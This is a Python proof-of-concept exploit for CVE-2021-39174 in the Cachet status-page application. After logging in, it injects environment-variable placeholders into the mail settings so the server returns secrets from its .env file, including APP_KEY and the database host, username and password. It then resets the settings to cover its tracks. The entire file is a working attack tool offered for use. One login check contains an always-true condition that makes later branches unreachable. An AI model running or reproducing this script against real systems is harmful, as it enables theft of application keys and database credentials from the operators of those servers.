import requests
from bs4 import BeautifulSoup
import argparse
from sys import exit
from time import sleep
from random import randint



parser = argparse.ArgumentParser(description='Cachet configuration leak dumper. CVE-2021-39174 PoC.')
parser.add_argument('-n', dest='username', action='store', required=True,
                    help='username or email to authenticate with')
parser.add_argument('-p', dest='password', action='store', required=True,
                    help='password to authenticate with')
parser.add_argument('-u', dest='url', action='store', required=True,
                    help='URL of the web application')
parser.add_argument('-x', dest='proxy', action='store',
                    help='Proxy to use')
args = parser.parse_args()


s = requests.Session()
s.trust_env = False
s.proxies.update({"http": args.proxy, "https": args.proxy})


dotenv_variables = """\
APP_KEY
DB_DRIVER
DB_HOST
DB_DATABASE
DB_USERNAME
DB_PASSWORD"""


def chunker(seq, size):
    return (seq[pos:pos + size] for pos in range(0, len(seq), size))


def get_token():
    print(f"[+] Getting CSRF token")
    req = s.get(args.url, timeout=20)
    soup = BeautifulSoup(req.text, "html.parser")
    try:
        token = soup.find("meta", {"name": "token"})["content"]
        print(f"[+] CSRF token: {token}")
        return token
    except TypeError:
        print(f"[!] Could not get CSRF token from page")
        exit()

def login():
    print(f"[+] Logging in as user '{args.username}'")
    login_url = f"{args.url}/auth/login"
    post_data = {"_token": csrf_token, "username": args.username, "password": args.password}
    req = s.post(login_url, data=post_data, timeout=20)

    if "auth/logout" in req.text:
        print("[+] Successfully logged in")
    elif "Invalid username or password":
        print("[!] Invalid credentials")
        exit()
    elif "Rate limit exceeded." in req.text:
        print("[!] You're being rate-limited")
        exit()
    else:
        print("[!] Unexpected reply from application")
        exit()


def get_config_values():
    print(f"[+] Getting current field values")
    url = f"{args.url}/dashboard/settings/mail"
    req = s.get(url, timeout=20)
    if "Mail Driver" in req.text:
        soup = BeautifulSoup(req.text, "html.parser")
        select_tag = soup.find("select", {"name": "config[mail_driver]"})

        initial_values = {"mail_driver": select_tag.select_one('option:checked')["value"],
                          "mail_host": soup.find("input", {"name": "config[mail_host]"})["value"],
                          "mail_address": soup.find("input", {"name": "config[mail_address]"})["value"],
                          "mail_username": soup.find("input", {"name": "config[mail_username]"})["value"],
                          "mail_password": soup.find("input", {"name": "config[mail_password]"})["value"]}    
        return initial_values
    else:
        print("[!] Could not find relevant input fields in page")
        exit()


def set_mail_config(values):
    url = f"{args.url}/dashboard/settings/mail"
    multipart_data = {'_token': (None, csrf_token),
                      'config[mail_driver]': (None, values["mail_driver"]),
                      'config[mail_host]': (None, values["mail_host"]),
                      'config[mail_address]': (None, values["mail_address"]),
                      'config[mail_username]': (None, values["mail_username"]),
                      'config[mail_password]': (None, values["mail_password"])
                      }
    while True:
        try:             
            req = s.post(url, files=multipart_data, timeout=20)
            break
        except requests.exceptions.ConnectionError:
            print("[+] Connection error. Retrying in 5s.")
            sleep(5)
            continue


def extract_variables(variables):
    url = f"{args.url}/dashboard/settings/mail"
    new_values = initial_values
    payload = "".join(['${{{0}}}<x>'.format(x) for x in variables])
    payload = f"{randint(1000000000, 9999999999)}<x>{payload}"
    new_values["mail_address"] = payload
    
    while True:
        sleep(5)
        try:
            print("[+] Sending payload")
            set_mail_config(new_values)
            req = s.get(url, timeout=20)
            break
        except requests.exceptions.ConnectionError:
            print("[+] Connection error. Retrying in 5.")
            continue
    
    soup = BeautifulSoup(req.text, "html.parser")
    payload_response = soup.find("input", {"name": "config[mail_address]"})["value"]
    variable_values = payload_response[13:].split("<x>")
    return variable_values
    

csrf_token = get_token()
login()
initial_values = get_config_values()

random_values = initial_values
random_values["mail_address"] = randint(1000000000, 9999999999)
set_mail_config(random_values)

extracted = extract_variables(dotenv_variables.splitlines())
result = zip(dotenv_variables.splitlines(), extracted)
print("[+] Extracted the following values:")
for i in result:
    print(f"- {i[0]}\t\t= {i[1]}")
print("[+] Unsetting payload variable")
set_mail_config(initial_values)
print("[+] Exiting")
exit()